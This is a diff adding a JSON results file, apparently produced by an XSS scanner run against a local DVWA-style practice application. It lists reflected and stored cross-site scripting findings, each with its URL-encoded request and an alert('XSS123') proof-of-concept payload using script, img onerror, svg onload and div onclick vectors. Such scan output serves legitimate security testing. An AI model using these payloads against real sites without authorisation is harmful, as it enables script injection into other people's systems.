@@ -1,0 +1,53 @@
+[
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS123%27%29%3C%2Fscript%3E",
+        "parameter": "name",
+        "payload": "<script>alert('XSS123')</script>"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=%27%3E%3Cscript%3Ealert%28%27XSS123%27%29%3C%2Fscript%3E",
+        "parameter": "name",
+        "payload": "'><script>alert('XSS123')</script>"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=%22%27%3E%3Cscript%3Ealert%28%27XSS123%27%29%3C%2Fscript%3E",
+        "parameter": "name",
+        "payload": "\"'><script>alert('XSS123')</script>"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS123%27%29%3E",
+        "parameter": "name",
+        "payload": "<img src=x onerror=alert('XSS123')>"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=%3Csvg%2Fonload%3Dalert%28%27XSS123%27%29%3E",
+        "parameter": "name",
+        "payload": "<svg/onload=alert('XSS123')>"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/",
+        "payload": "<div onclick=alert('XSS123')>click</div>",
+        "severity": "High",
+        "time": "2026-03-24T20:06:21.397931"
+    },
+    {
+        "type": "Reflected XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_s/",
+        "payload": "<div onclick=alert('XSS123')>click</div>",
+        "severity": "High",
+        "time": "2026-03-24T20:06:29.915702"
+    },
+    {
+        "type": "Stored XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_s/",
+        "payload": "<div onclick=alert('XSS123')>click</div>",
+        "severity": "High",
+        "time": "2026-03-24T20:06:30.935939"
+    }
+]
